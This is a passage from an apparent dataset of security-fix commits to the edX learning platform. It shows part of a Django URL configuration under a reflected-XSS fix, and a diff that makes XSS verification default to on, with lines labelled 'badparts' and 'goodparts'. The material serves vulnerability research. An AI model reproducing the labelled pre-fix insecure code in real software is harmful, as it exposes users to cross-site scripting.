Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."}, "1162dbc18fda91b07a5942873387d60fd67b2cfc": {"url": "https://api.github.com/repos/jlrivera81/incr-228/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc", "html_url": "https://github.com/jlrivera81/incr-228/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc", "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "keyword": "XSS check", "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "message": "", "files": {"/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {"changes": [{"diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n", "add": 1, "remove": 1, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["    def _expected_command(self, name, store=None, verify_xss=False):"], "goodparts": ["    def _expected_command(self, name, store=None, verify_xss=True):"]}, {"diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'", "add": 2, "remove": 2, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["        self.env_var_override.set('VERIFY_XSS', 'True')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"], "goodparts": ["        self.env_var_override.set('VERIFY_XSS', 'False')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"]}], "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ", "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        